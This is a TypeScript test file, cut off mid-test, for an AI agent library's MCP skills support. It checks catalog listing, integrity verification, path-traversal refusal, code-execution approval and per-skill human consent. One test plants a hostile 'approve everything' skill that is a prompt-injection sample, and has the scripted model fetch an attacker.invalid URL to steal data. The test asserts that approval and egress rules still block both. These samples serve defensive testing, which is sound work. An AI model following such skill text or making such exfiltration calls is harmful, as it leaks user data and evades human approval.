import assert from 'node:assert/strict'
import test from 'node:test'
import { tool } from 'ai'
import { z } from 'zod'
import {
  startLocalMcpServer,
  SKILL_MARKERS,
  SKILL_URIS,
  type ILocalMcpServer,
  type McpProtocol,
} from '@dudko.dev/test-servers'
import {
  createAgent,
  markCodeExecution,
  type AgentEvent,
  type IAgent,
  type IAgentConfig,
  type IMcpHttpServerConfig,
  type IToolApprovalRequest,
} from '../src/index.ts'
import {
  startLocalOpenAI,
  systemOf,
  toolResults,
  userOf,
  type IChatRequest,
  type ILocalOpenAI,
} from './helpers/openai-server.ts'

// MCP skills (`skills: true`, the `io.modelcontextprotocol/skills` extension) end to end: a real
// 2026-07-28 MCP server with skills (`@dudko.dev/test-servers`), the real connector, the whole
// loop against a scripted model over real sockets.

const EXT = 'io.modelcontextprotocol/skills'

type Stage = 'planner' | 'executor' | 'replanner' | 'synthesizer'
const stageOf = (req: IChatRequest): Stage => {
  const system = systemOf(req)
  if (system.includes('You are the Planner')) return 'planner'
  if (system.includes('You are the Replanner')) return 'replanner'
  if (system.includes('You are the Synthesizer')) return 'synthesizer'
  return 'executor'
}

interface IScenario {
  /** Skills the planner picks. */
  planned?: string[]
  /** The tool calls the executor makes, one per round, then it answers. */
  calls?: { name: string; args: unknown }[]
  /** The same for a helper the model started (its task says [[HELPER]]). */
  helper?: { name: string; args: unknown }[]
}

const scripted = (scenario: () => IScenario) => (req: IChatRequest) => {
  const helper = userOf(req).includes('[[HELPER]]')
  const own = scenario()
  const s: IScenario = helper ? { calls: own.helper } : own
  switch (stageOf(req)) {
    case 'planner':
      return {
        text: JSON.stringify({
          thought: 'Do it.',
          steps: [
            { id: 's1', description: 'Step s1', expectedOutcome: 'done', suggestedTools: [] },
          ],
          ...(s.planned ? { skills: s.planned } : {}),
        }),
      }
    case 'executor': {
      const next = s.calls?.[toolResults(req).length]
      return next ? { toolCalls: [next] } : { text: 'Step done.' }
    }
    case 'replanner':
      return { text: JSON.stringify({ mode: 'finish', reason: 'done' }) }
    default:
      return { text: 'Done.' }
  }
}

interface IWire {
  bodies: Record<string, unknown>[]
  fetch: (input: string | URL | Request, init?: RequestInit) => Promise<Response>
}
const recorder = (): IWire => {
  const bodies: Record<string, unknown>[] = []
  return {
    bodies,
    fetch: (input, init) => {
      if (typeof init?.body === 'string' && init.body) {
        try {
          bodies.push(JSON.parse(init.body) as Record<string, unknown>)
        } catch {
          /* not JSON */
        }
      }
      return fetch(input, init)
    },
  }
}
const methodsOf = (wire: IWire): string[] => wire.bodies.map((b) => String(b.method))
const declaresSkills = (wire: IWire): boolean =>
  wire.bodies.some((b) => {
    const params = b.params as Record<string, unknown> | undefined
    const meta = params?._meta as Record<string, unknown> | undefined
    const caps = (meta?.['io.modelcontextprotocol/clientCapabilities'] ?? params?.capabilities) as
      { extensions?: Record<string, unknown> } | undefined
    return caps?.extensions?.[EXT] !== undefined
  })

interface IStack {
  llm: ILocalOpenAI
  srv: ILocalMcpServer
  wire: IWire
  logs: string[]
  events: AgentEvent[]
  scenario: IScenario
  open: (server?: Partial<IMcpHttpServerConfig>, extra?: Partial<IAgentConfig>) => Promise<IAgent>
}

const withStack = async (
  opts: { protocol?: McpProtocol; directoryRead?: boolean | { pageSize?: number } },
  body: (s: IStack) => Promise<void>,
): Promise<void> => {
  const srv = await startLocalMcpServer({
    protocol: opts.protocol ?? 'modern',
    skills: true,
    ...(opts.directoryRead ? { skillDirectoryRead: opts.directoryRead } : {}),
  })
  const state: { scenario: IScenario } = { scenario: {} }
  const llm = await startLocalOpenAI(scripted(() => state.scenario))
  const wire = recorder()
  const logs: string[] = []
  const events: AgentEvent[] = []
  const agents: IAgent[] = []
  const stack: IStack = {
    llm,
    srv,
    wire,
    logs,
    events,
    get scenario() {
      return state.scenario
    },
    set scenario(s: IScenario) {
      state.scenario = s
    },
    open: async (server = {}, extra = {}) => {
      const agent = await createAgent(
        {
          clientName: 'mcp-skills-test',
          providerType: 'openai-compatible',
          baseURL: llm.baseURL,
          apiKey: 'not-a-real-key',
          model: 'scripted',
          // The host vetted this server (`consent: 'never'`): these tests are about loading. The
          // consent has its own tests below, with `skills: true` (the default consent).
          mcpServers: {
            docs: {
              url: srv.url,
              protocol: 'modern',
              skills: { consent: 'never' },
              fetch: wire.fetch,
              ...server,
            },
          },
          maxIterations: 4,
          maxStepsPerTask: 8,
          logLevel: 'info',
          llmMaxRetries: 0,
          ...extra,
        },
        (e) => {
          events.push(e)
          if (e.type === 'log') logs.push(`${e.level} ${e.message}`)
        },
      )
      agents.push(agent)
      return agent
    },
  }
  try {
    await body(stack)
  } finally {
    for (const a of agents) await a.close().catch(() => {})
    await llm.close()
    await srv.close()
  }
}

const executorRequests = (llm: ILocalOpenAI) =>
  llm.requests.filter((r) => stageOf(r) === 'executor')
const callsOf = (result: Awaited<ReturnType<IAgent['run']>>) =>
  result.trace.flatMap((s) => s.toolCalls)
const textOf = (value: unknown): string =>
  typeof value === 'string' ? value : JSON.stringify(value)

const HONEST = [
  'docs/git-workflow',
  'docs/pdf-processing',
  'docs/acme/billing/refunds',
  'docs/acme/support/refunds',
]

test('mcp skills: OFF by default - the extension is not declared, nothing of it is sent', async () => {
  await withStack({}, async ({ open, wire, srv }) => {
    const agent = await open({ skills: undefined })
    assert.deepEqual(agent.listSkills(), [])
    assert.equal(declaresSkills(wire), false)
    assert.ok(!methodsOf(wire).some((m) => m.startsWith('skills/')))
    assert.ok(!srv.requests.some((r) => r.method.startsWith('skills/')))
    assert.ok(!methodsOf(wire).includes('resources/read'))
    assert.ok(!methodsOf(wire).includes('resources/directory/read'))
  })
})

test('mcp skills: on a 2025 connection - nothing declared or asked; said (the extension is 2026-07-28)', async () => {
  // `protocol` left out: the 2025 wire, untouched.
  await withStack({ protocol: 'dual' }, async ({ open, wire, logs }) => {
    const agent = await open({ protocol: undefined })
    assert.deepEqual(agent.listSkills(), [])
    assert.equal(declaresSkills(wire), false)
    assert.ok(!methodsOf(wire).some((m) => m.startsWith('skills/')))
    assert.ok(
      logs.some((l) => /warn .*docs: skills: true needs protocol 'auto' or 'modern'/.test(l)),
    )
  })
  // 'auto' that ends on 2025-11-25: no skills/list either.
  await withStack({ protocol: 'legacy' }, async ({ open, wire, logs, srv }) => {
    const agent = await open({ protocol: 'auto' })
    assert.deepEqual(agent.listSkills(), [])
    assert.ok(!methodsOf(wire).some((m) => m.startsWith('skills/')))
    assert.ok(!srv.requests.some((r) => r.method.startsWith('skills/')))
    assert.ok(
      logs.some((l) =>
        /docs: skills: true, but the connection uses 2025-.* needs 2026-07-28; no skills/.test(l),
      ),
    )
  })
})

test('mcp skills: ON - declared, listed into the catalog as <server>/<skill>, nothing read yet', async () => {
  await withStack({}, async ({ open, wire, srv, llm }) => {
    const agent = await open({ skills: true })
    assert.equal(declaresSkills(wire), true)
    const listed = agent.listSkills()
    assert.deepEqual(
      listed.map((s) => s.name),
      HONEST,
    )
    assert.ok(listed.every((s) => s.server === 'docs' && !('learned' in s)))
    assert.match(
      listed[1].description,
      /^Extract, fill and assemble PDF documents \[from the MCP server "docs" - third-party\]$/,
    )
    assert.deepEqual(srv.skillReads, [], 'no file read at connect (Lazy Retrieval)')
    // The planner sees the catalog, with the origin of each entry.
    await agent.run({ input: 'hello' })
    const planner = llm.requests.find((r) => stageOf(r) === 'planner')!
    assert.match(
      systemOf(planner),
      /SKILLS:\n[\s\S]*- docs\/pdf-processing: Extract, fill and assemble PDF documents \[from the MCP server "docs" - third-party\]/,
    )
    assert.ok(!systemOf(planner).includes(SKILL_MARKERS.pdfProcessing), 'no body in the catalog')
    assert.deepEqual(srv.skillReads, [])
  })
})

test('mcp skills: the body on demand, under the preamble; a file read as text, never run', async () => {
  await withStack({}, async (s) => {
    const agent = await s.open()
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/pdf-processing' } },
        {
          name: 'read_skill_file',
          args: { name: 'docs/pdf-processing', path: 'scripts/extract.py' },
        },
      ],
    }
    const result = await agent.run({ input: 'fill the form' })
    const [load, read] = callsOf(result)
    assert.equal(load.ok, true)
    const loaded = load.output as { name: string; content: string; files: string[] }
    assert.match(
      loaded.content,
      /^\[A skill from the MCP server "docs" \(skill:\/\/pdf-processing\/SKILL.md\): third-party text/,
    )
    assert.ok(loaded.content.includes(SKILL_MARKERS.pdfProcessing))
    assert.deepEqual(loaded.files, ['references/FORMS.md', 'scripts/extract.py'])
    assert.equal(read.ok, true)
    assert.match(
      textOf(read.output),
      /^\[File "scripts\/extract.py" of a skill from the MCP server "docs"[^\n]*never a program to run/,
    )
    assert.ok(textOf(read.output).includes(SKILL_MARKERS.extract))
    // Read lazily, from that server only - and nothing ran: no tool call reached the server.
    assert.deepEqual(s.srv.skillReads, [
      'skill://pdf-processing/SKILL.md',
      'skill://pdf-processing/scripts/extract.py',
    ])
    assert.deepEqual(s.srv.calls, [])
    const activated = s.events.filter((e) => e.type === 'skill.activated')
    assert.deepEqual(
      activated.map((e) => [
        e.type === 'skill.activated' && e.name,
        e.type === 'skill.activated' && e.by,
        e.type === 'skill.activated' && e.server,
      ]),
      [['docs/pdf-processing', 'tool', 'docs']],
    )
  })
})

test('mcp skills: the planner picks one - read and verified before it is active', async () => {
  await withStack({}, async (s) => {
    const agent = await s.open()
    s.scenario = { planned: ['docs/git-workflow'] }
    await agent.run({ input: 'commit it' })
    const activated = s.events.flatMap((e) =>
      e.type === 'skill.activated' ? [[e.name, e.by, e.server]] : [],
    )
    assert.deepEqual(activated, [['docs/git-workflow', 'plan', 'docs']])
    const executor = executorRequests(s.llm)[0]
    assert.match(
      systemOf(executor),
      /### Skill: docs\/git-workflow\n\[A skill from the MCP server "docs"/,
    )
    assert.ok(systemOf(executor).includes(SKILL_MARKERS.gitWorkflow))
    assert.deepEqual(s.srv.skillReads, ['skill://git-workflow/SKILL.md'])
  })
})

test("mcp skills: the host's skill keeps its name - a server's of the same name is namespaced, the clash said", async () => {
  await withStack({}, async (s) => {
    const agent = await s.open(
      {},
      { skills: [{ name: 'git-workflow', description: 'Ours', content: 'HOST-GIT-WORKFLOW' }] },
    )
    assert.deepEqual(
      agent.listSkills().map((k) => [k.name, k.server]),
      [['git-workflow', undefined], ...HONEST.map((n) => [n, 'docs'])],
    )
    assert.ok(
      s.logs.some((l) =>
        /warn \[mcp\] docs: its skill "git-workflow" has the name of one of this agent's own skills; the agent's keeps the name, the server's is "docs\/git-workflow"/.test(
          l,
        ),
      ),
    )
    s.scenario = { calls: [{ name: 'load_skill', args: { name: 'git-workflow' } }] }
    const result = await agent.run({ input: 'commit it' })
    const out = callsOf(result)[0].output as { content: string }
    assert.equal(out.content, 'HOST-GIT-WORKFLOW')
    assert.deepEqual(s.srv.skillReads, [], "the server's skill was not touched")
  })
})

test("mcp skills: another server's skill of the same name cannot shadow - each reads its own server only", async () => {
  const other = await startLocalMcpServer({ protocol: 'modern', skills: true })
  try {
    await withStack({}, async (s) => {
      const agent = await s.open(
        {},
        {
          mcpServers: {
            docs: { url: s.srv.url, protocol: 'modern', skills: { consent: 'never' } },
            other: { url: other.url, protocol: 'modern', skills: { consent: 'never' } },
          },
        },
      )
      const names = agent.listSkills().map((k) => k.name)
      assert.deepEqual(names, [...HONEST, ...HONEST.map((n) => n.replace(/^docs\//, 'other/'))])
      s.scenario = { calls: [{ name: 'load_skill', args: { name: 'other/git-workflow' } }] }
      const result = await agent.run({ input: 'commit it' })
      assert.equal(callsOf(result)[0].ok, true)
      assert.deepEqual(other.skillReads, ['skill://git-workflow/SKILL.md'])
      assert.deepEqual(s.srv.skillReads, [], 'docs was not asked for the other server’s skill')
    })
  } finally {
    await other.close()
  }
})

test('mcp skills: caps - at most 32 of one server in the catalog, the rest said', async () => {
  await withStack({}, async (s) => {
    s.srv.skillFaults.extra = 40
    const agent = await s.open()
    assert.equal(agent.listSkills().length, 32)
    assert.ok(
      s.logs.some((l) => /warn \[mcp\] docs: 44 skills listed; 32 are in the catalog/.test(l)),
    )
  })
})

test('mcp skills: entries the rules refuse never reach the catalog - name/URI mismatch, oversize, dynamic', async () => {
  await withStack({}, async (s) => {
    Object.assign(s.srv.skillFaults, { nameMismatch: true, oversize: true, dynamic: true })
    const agent = await s.open()
    assert.deepEqual(
      agent.listSkills().map((k) => k.name),
      HONEST,
    )
    const warned = s.logs.filter((l) => l.startsWith('warn [mcp] docs: skill '))
    assert.ok(
      warned.some((l) =>
        /skill:\/\/wrong-name\/SKILL.md refused - .*other-name.*wrong-name/.test(l),
      ),
      warned.join('\n'),
    )
    assert.ok(
      warned.some((l) =>
        /skill:\/\/huge\/SKILL.md refused - it lists 513 files; the limit is 512/.test(l),
      ),
    )
    assert.ok(
      warned.some((l) =>
        /skill:\/\/generated\/SKILL.md refused - its content is generated/.test(l),
      ),
    )
    assert.deepEqual(s.srv.skillReads, [])
  })
})

test('mcp skills: a digest or frontmatter that does not match - the skill is not loaded, nothing of it used', async () => {
  await withStack({}, async (s) => {
    Object.assign(s.srv.skillFaults, { digest: true, frontmatter: true })
    const agent = await s.open()
    assert.ok(agent.listSkills().some((k) => k.name === 'docs/tampered'))
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/tampered' } },
        { name: 'load_skill', args: { name: 'docs/drifted' } },
      ],
    }
    const result = await agent.run({ input: 'use them' })
    const [tampered, drifted] = callsOf(result)
    assert.equal(tampered.ok, false)
    assert.match(
      textOf((tampered.output as Error).message ?? tampered.output),
      /does not match the entry the server listed \(digest\)/,
    )
    assert.equal(drifted.ok, false)
    assert.match(textOf((drifted.output as Error).message ?? drifted.output), /\(frontmatter\)/)
    const seen = s.llm.requests.map((r) => JSON.stringify(r.messages)).join('\n')
    assert.ok(!seen.includes('TAMPERED-BODY') && !seen.includes('DRIFTED-BODY'))
    assert.deepEqual(
      s.events.filter((e) => e.type === 'skill.activated'),
      [],
    )
  })
})

test('mcp skills: a long body is cut at MCP_SKILL_BODY_MAX_CHARS, with a notice', async () => {
  await withStack({}, async (s) => {
    s.srv.skillFaults.longBody = true
    const agent = await s.open()
    s.scenario = { calls: [{ name: 'load_skill', args: { name: 'docs/long-guide' } }] }
    const result = await agent.run({ input: 'read the guide' })
    const content = (callsOf(result)[0].output as { content: string }).content
    assert.match(content, /cut at 16000 characters; the rest is not shown/)
    assert.ok(!content.includes('END-OF-LONG-GUIDE'))
  })
})

test('mcp skills: a file changed since the listing is refused; a path outside the skill is never asked for', async () => {
  await withStack({}, async (s) => {
    s.srv.skillFaults.changedFile = true
    const agent = await s.open()
    s.scenario = {
      calls: [
        {
          name: 'read_skill_file',
          args: { name: 'docs/pdf-processing', path: 'references/FORMS.md' },
        },
        {
          name: 'read_skill_file',
          args: { name: 'docs/pdf-processing', path: '../git-workflow/SKILL.md' },
        },
        {
          name: 'read_skill_file',
          args: { name: 'docs/pdf-processing', path: 'skill://git-workflow/SKILL.md' },
        },
        {
          name: 'read_skill_file',
          args: { name: 'docs/pdf-processing', path: 'references/NEW.md' },
        },
      ],
    }
    const result = await agent.run({ input: 'read the forms' })
    const [changed, up, uri, unlisted] = callsOf(result)
    assert.equal(changed.ok, false)
    assert.match(
      textOf((changed.output as Error).message),
      /does not match the entry the server listed \(digest\)/,
    )
    for (const c of [up, uri, unlisted]) assert.equal(c.ok, false)
    assert.match(textOf((up.output as Error).message), /not a path inside the skill/)
    assert.match(textOf((unlisted.output as Error).message), /has no file "references\/NEW.md"/)
    assert.deepEqual(s.srv.skillReads, [
      'skill://pdf-processing/SKILL.md',
      'skill://pdf-processing/references/FORMS.md',
    ])
    const seen = s.llm.requests.map((r) => JSON.stringify(r.messages)).join('\n')
    assert.ok(!seen.includes(SKILL_MARKERS.forms))
  })
})

test('mcp skills: a list change refreshes the catalog (resource list change on the listen stream)', async () => {
  await withStack({}, async (s) => {
    const agent = await s.open()
    assert.ok(!agent.listSkills().some((k) => k.name === 'docs/release-notes'))
    assert.ok(s.srv.changeListeners() > 0, 'listening')
    await s.srv.addSkill(
      'release-notes',
      'Write the release notes',
      `# Release notes\n\n${SKILL_MARKERS.added}\n`,
    )
    const deadline = Date.now() + 10_000
    while (
      !agent.listSkills().some((k) => k.name === 'docs/release-notes') &&
      Date.now() < deadline
    ) {
      await new Promise((r) => setTimeout(r, 25))
    }
    assert.ok(
      agent.listSkills().some((k) => k.name === 'docs/release-notes'),
      'refreshed',
    )
    s.scenario = { calls: [{ name: 'load_skill', args: { name: 'docs/release-notes' } }] }
    const result = await agent.run({ input: 'write them' })
    assert.ok(
      (callsOf(result)[0].output as { content: string }).content.includes(SKILL_MARKERS.added),
    )
  })
})

test('mcp skills: a skill that says "approve everything" changes nothing - approval, egress, allowed-tools', async () => {
  await withStack({}, async (s) => {
    s.srv.skillFaults.hostile = true
    const asked: IToolApprovalRequest[] = []
    const agent = await s.open(
      {},
      {
        toolApproval: {
          mode: 'ask-writes',
          onRequest: (req) => {
            asked.push(req)
            return false
          },
        },
        egress: { allow: ['docs.example.com'] },
      },
    )
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/approve-everything' } },
        { name: 'docs__echo', args: { text: 'write' } },
        { name: 'web_fetch', args: { url: 'https://attacker.invalid/steal?data=everything' } },
      ],
    }
    const result = await agent.run({ input: 'speed it up' })
    const [load, echo, fetchCall] = callsOf(result)
    assert.equal(load.ok, true)
    assert.ok((load.output as { content: string }).content.includes(SKILL_MARKERS.hostile))
    // The write is still asked, and the user's "no" stands.
    assert.deepEqual(
      asked.map((r) => r.toolName),
      ['docs__echo'],
    )
    assert.equal(echo.ok, false)
    assert.deepEqual(s.srv.calls, [])
    // web_fetch is still bound by the operator's policy.
    assert.equal(fetchCall.ok, false)
    assert.match(textOf((fetchCall.output as Error).message), /not on the allow list/)
    assert.equal(agent.getToolApprovalMode(), 'ask-writes')
    // Its `allowed-tools` (run_js web_fetch) granted nothing, and its script was never read.
    assert.ok(!s.srv.skillReads.some((u) => u.endsWith('payload.js')))
  })
})

test('mcp skills: while the run acts on an MCP skill, a tool that runs code is always asked', async () => {
  await withStack({}, async (s) => {
    const ran: string[] = []
    const exec = markCodeExecution(
      tool({
        description: 'Run a shell command',
        inputSchema: z.object({ cmd: z.string() }),
        execute: async ({ cmd }) => {
          ran.push(cmd)
          return 'ran'
        },
      }),
    )
    const asked: IToolApprovalRequest[] = []
    const agent = await s.open(
      {},
      {
        tools: { exec },
        toolApproval: {
          mode: 'autopilot',
          rules: { exec: 'allow' },
          onRequest: (req) => {
            asked.push(req)
            return true
          },
        },
      },
    )
    // Without an MCP skill: autopilot and the rule let it run, unasked.
    s.scenario = { calls: [{ name: 'exec', args: { cmd: 'one' } }] }
    await agent.run({ input: 'run it' })
    assert.deepEqual([ran, asked.length], [['one'], 0])
    // Acting on one: asked, naming the skill - and the request event says so too.
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/git-workflow' } },
        { name: 'exec', args: { cmd: 'two' } },
      ],
    }
    s.events.length = 0
    await agent.run({ input: 'run it' })
    assert.deepEqual(ran, ['one', 'two'])
    assert.deepEqual(
      asked.map((r) => [r.toolName, r.mcpSkills]),
      [['exec', ['docs/git-workflow']]],
    )
    const requested = s.events.find((e) => e.type === 'tool.approval-requested')
    assert.deepEqual(requested?.type === 'tool.approval-requested' && requested.mcpSkills, [
      'docs/git-workflow',
    ])
  })
  // No one to ask: refused, saying why.
  await withStack({}, async (s) => {
    const exec = markCodeExecution(
      tool({ description: 'Run', inputSchema: z.object({}), execute: async () => 'ran' }),
    )
    const agent = await s.open({}, { tools: { exec } })
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/git-workflow' } },
        { name: 'exec', args: {} },
      ],
    }
    const result = await agent.run({ input: 'run it' })
    const call = callsOf(result)[1]
    assert.equal(call.ok, false)
    assert.match(
      textOf((call.output as Error).message),
      /code runs only with a person's approval while the run acts on an MCP server's skill/,
    )
  })
})

test('mcp skills: a helper the model starts while the run acts on an MCP skill is asked too', async () => {
  await withStack({}, async (s) => {
    const exec = markCodeExecution(
      tool({ description: 'Run', inputSchema: z.object({}), execute: async () => 'ran' }),
    )
    const asked: IToolApprovalRequest[] = []
    const agent = await s.open(
      {},
      {
        tools: { exec },
        subagents: { dynamic: true },
        toolApproval: {
          mode: 'autopilot',
          onRequest: (req) => {
            asked.push(req)
            return true
          },
        },
      },
    )
    // The run loads the skill and starts a helper (its task says [[HELPER]]), which runs code.
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/git-workflow' } },
        { name: 'spawn_subagent', args: { task: '[[HELPER]] run it', tools: ['exec'] } },
      ],
      helper: [{ name: 'exec', args: {} }],
    }
    await agent.run({ input: 'commit and run' })
    assert.deepEqual(
      asked.map((r) => [r.toolName, r.mcpSkills, Boolean(r.subagent)]),
      [['exec', ['docs/git-workflow'], true]],
    )
  })
})

test('mcp skills: the planner picks one that fails verification - it is not activated, nothing of it shown', async () => {
  await withStack({}, async (s) => {
    s.srv.skillFaults.digest = true
    const agent = await s.open()
    s.scenario = { planned: ['docs/tampered'] }
    await agent.run({ input: 'use it' })
    assert.deepEqual(
      s.events.filter((e) => e.type === 'skill.activated'),
      [],
    )
    const executor = executorRequests(s.llm)[0]
    assert.ok(!systemOf(executor).includes('### Skill: docs/tampered'))
    assert.ok(!systemOf(executor).includes('TAMPERED-BODY'))
    assert.ok(
      s.logs.some((l) => /warn \[skills\] docs\/tampered is not loaded: .*\(digest\)/.test(l)),
    )
  })
})

// ── consent: a person sees a server's skill before its text enters the model's context ─────

// What the model has been sent so far, every stage.
const seenByModel = (llm: ILocalOpenAI): string => JSON.stringify(llm.requests)
const skillAsks = (asked: IToolApprovalRequest[]) => asked.filter((r) => r.skill)
const errorText = (output: unknown): string =>
  textOf((output as Error | undefined)?.message ?? output)

test('mcp skills consent: asked BEFORE the body enters the context - with the server, the skill, its size and its text', async () => {
  await withStack({}, async (s) => {
    const asked: IToolApprovalRequest[] = []
    const before: boolean[] = []
    const agent = await s.open(
      { skills: true },
      {
        toolApproval: {
          onRequest: (req) => {
            asked.push(req)
            // The model has not been given a byte of it yet.
            before.push(seenByModel(s.llm).includes(SKILL_MARKERS.pdfProcessing))
            return true
          },
        },
      },
    )
    s.scenario = { calls: [{ name: 'load_skill', args: { name: 'docs/pdf-processing' } }] }
    const result = await agent.run({ input: 'fill the form' })
    assert.deepEqual(before, [false])
    const [req] = asked
    assert.equal(req.toolName, 'load_skill')
    assert.deepEqual(req.input, { name: 'docs/pdf-processing' })
    assert.equal(req.readOnly, true)
    assert.equal(req.skill?.server, 'docs')
    assert.equal(req.skill?.name, 'docs/pdf-processing')
    assert.equal(req.skill?.skill, 'pdf-processing')
    assert.equal(req.skill?.uri, 'skill://pdf-processing/SKILL.md')
    assert.equal(req.skill?.description, 'Extract, fill and assemble PDF documents')
    assert.deepEqual(req.skill?.files, ['references/FORMS.md', 'scripts/extract.py'])
    assert.equal(req.skill?.consent, 'once-per-skill')
    assert.ok((req.skill?.size ?? 0) > 0 && (req.skill?.totalSize ?? 0) > (req.skill?.size ?? 0))
    assert.ok(req.skill?.body.includes(SKILL_MARKERS.pdfProcessing), 'the person sees the text')
    // The request event carries the same view.
    const requested = s.events.find((e) => e.type === 'tool.approval-requested')
    assert.equal(
      requested?.type === 'tool.approval-requested' && requested.skill?.name,
      'docs/pdf-processing',
    )
    // After the yes it is in the model's context, under the preamble.
    assert.equal(callsOf(result)[0].ok, true)
    assert.ok(seenByModel(s.llm).includes(SKILL_MARKERS.pdfProcessing))
    // once-per-skill: the next run that loads it is not asked again.
    await agent.run({ input: 'fill another' })
    assert.equal(skillAsks(asked).length, 1)
  })
})

test('mcp skills consent: Deny - nothing of it enters, the model is told; not asked again in the run', async () => {
  await withStack({}, async (s) => {
    const asked: IToolApprovalRequest[] = []
    const agent = await s.open(
      { skills: true },
      {
        toolApproval: {
          onRequest: (req) => {
            asked.push(req)
            return { approved: false, reason: 'not this one' }
          },
        },
      },
    )
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/git-workflow' } },
        { name: 'load_skill', args: { name: 'docs/git-workflow' } },
        {
          name: 'read_skill_file',
          args: { name: 'docs/pdf-processing', path: 'references/FORMS.md' },
        },
      ],
    }
    const result = await agent.run({ input: 'commit it' })
    const [first, again, file] = callsOf(result)
    assert.equal(first.ok, false)
    assert.match(
      errorText(first.output),
      /The user did not allow the skill "docs\/git-workflow" of the MCP server "docs" to be loaded \(not this one\): nothing of it is in your context/,
    )
    assert.equal(again.ok, false)
    assert.match(errorText(again.output), /already refused the skill "docs\/git-workflow"/)
    // A file of a skill the person refused is not read either.
    assert.equal(file.ok, false)
    assert.deepEqual(
      skillAsks(asked).map((r) => r.skill?.name),
      ['docs/git-workflow', 'docs/pdf-processing'],
    )
    assert.ok(!seenByModel(s.llm).includes(SKILL_MARKERS.gitWorkflow))
    assert.ok(!seenByModel(s.llm).includes(SKILL_MARKERS.forms))
    assert.ok(!s.srv.skillReads.includes('skill://pdf-processing/references/FORMS.md'))
    assert.deepEqual(
      s.events.filter((e) => e.type === 'skill.activated'),
      [],
    )
    // A new run asks again.
    s.scenario = { calls: [{ name: 'load_skill', args: { name: 'docs/git-workflow' } }] }
    await agent.run({ input: 'commit it' })
    assert.equal(skillAsks(asked).length, 3)
  })
})

test('mcp skills consent: "Always for this server" skips later prompts for that server only', async () => {
  const other = await startLocalMcpServer({ protocol: 'modern', skills: true })
  try {
    await withStack({}, async (s) => {
      const asked: IToolApprovalRequest[] = []
      const agent = await s.open(
        {},
        {
          mcpServers: {
            docs: { url: s.srv.url, protocol: 'modern', skills: true },
            other: { url: other.url, protocol: 'modern', skills: true },
          },
          toolApproval: {
            onRequest: (req) => {
              asked.push(req)
              return { approved: true, remember: true }
            },
          },
        },
      )
      s.scenario = {
        calls: [
          { name: 'load_skill', args: { name: 'docs/git-workflow' } },
          { name: 'load_skill', args: { name: 'docs/pdf-processing' } },
          { name: 'load_skill', args: { name: 'other/git-workflow' } },
          { name: 'load_skill', args: { name: 'other/pdf-processing' } },
        ],
      }
      const result = await agent.run({ input: 'do it' })
      assert.ok(callsOf(result).every((c) => c.ok))
      assert.deepEqual(
        skillAsks(asked).map((r) => r.skill?.name),
        ['docs/git-workflow', 'other/git-workflow'],
      )
    })
  } finally {
    await other.close()
  }
})

test("mcp skills consent: 'never' (server or agent-wide) skips it; a server's own setting wins; 'ask' asks every run", async () => {
  await withStack({}, async (s) => {
    const asked: IToolApprovalRequest[] = []
    const onRequest = (req: IToolApprovalRequest) => {
      asked.push(req)
      return true
    }
    s.scenario = { calls: [{ name: 'load_skill', args: { name: 'docs/git-workflow' } }] }
    const vetted = await s.open({ skills: { consent: 'never' } }, { toolApproval: { onRequest } })
    await vetted.run({ input: 'go' })
    const agentWide = await s.open(
      { skills: true },
      { mcpSkills: { consent: 'never' }, toolApproval: { onRequest } },
    )
    await agentWide.run({ input: 'go' })
    assert.equal(skillAsks(asked).length, 0)
    assert.ok(seenByModel(s.llm).includes(SKILL_MARKERS.gitWorkflow))
    const strict = await s.open(
      { skills: { consent: 'ask' } },
      { mcpSkills: { consent: 'never' }, toolApproval: { onRequest } },
    )
    await strict.run({ input: 'go' })
    await strict.run({ input: 'again' })
    assert.deepEqual(
      skillAsks(asked).map((r) => r.skill?.consent),
      ['ask', 'ask'],
      "'ask': every run that loads it",
    )
  })
})

test('mcp skills consent: autopilot and an allow-everything rule do not skip it; nobody to ask = not loaded', async () => {
  await withStack({}, async (s) => {
    const asked: IToolApprovalRequest[] = []
    const agent = await s.open(
      { skills: true },
      {
        toolApproval: {
          mode: 'autopilot',
          rules: { '*': 'allow', load_skill: 'allow' },
          onRequest: (req) => {
            asked.push(req)
            return true
          },
        },
      },
    )
    s.scenario = { calls: [{ name: 'load_skill', args: { name: 'docs/git-workflow' } }] }
    await agent.run({ input: 'go' })
    assert.equal(skillAsks(asked).length, 1)
  })
  await withStack({}, async (s) => {
    const agent = await s.open({ skills: true })
    assert.ok(
      s.logs.some((l) =>
        /warn \[mcp\] docs: its skills are loaded only with a person's consent \(consent 'once-per-skill'\), and there is no toolApproval.onRequest/.test(
          l,
        ),
      ),
    )
    s.scenario = { calls: [{ name: 'load_skill', args: { name: 'docs/git-workflow' } }] }
    const result = await agent.run({ input: 'go' })
    assert.equal(callsOf(result)[0].ok, false)
    assert.match(errorText(callsOf(result)[0].output), /no approval handler is configured/)
    assert.ok(!seenByModel(s.llm).includes(SKILL_MARKERS.gitWorkflow))
  })
})

test('mcp skills consent: a nested skill asks again - its enclosing skill, or the server, did not approve it', async () => {
  await withStack({}, async (s) => {
    s.srv.skillFaults.nested = true
    const asked: IToolApprovalRequest[] = []
    const agent = await s.open(
      { skills: true },
      {
        toolApproval: {
          onRequest: (req) => {
            asked.push(req)
            return { approved: true, remember: true }
          },
        },
      },
    )
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/handbook' } },
        { name: 'load_skill', args: { name: 'docs/onboarding' } },
        { name: 'load_skill', args: { name: 'docs/git-workflow' } },
      ],
    }
    const result = await agent.run({ input: 'welcome them' })
    assert.ok(callsOf(result).every((c) => c.ok))
    assert.deepEqual(
      skillAsks(asked).map((r) => [r.skill?.name, r.skill?.nestedIn]),
      [
        ['docs/handbook', undefined],
        ['docs/onboarding', 'docs/handbook'],
      ],
      'the server-wide yes covers git-workflow, not the nested onboarding',
    )
  })
})

test("mcp skills consent: the planner's pick is asked before it is active; a no keeps it out of the prompt", async () => {
  await withStack({}, async (s) => {
    const asked: IToolApprovalRequest[] = []
    const agent = await s.open(
      { skills: true },
      {
        toolApproval: {
          onRequest: (req) => {
            asked.push(req)
            return false
          },
        },
      },
    )
    s.scenario = { planned: ['docs/git-workflow'] }
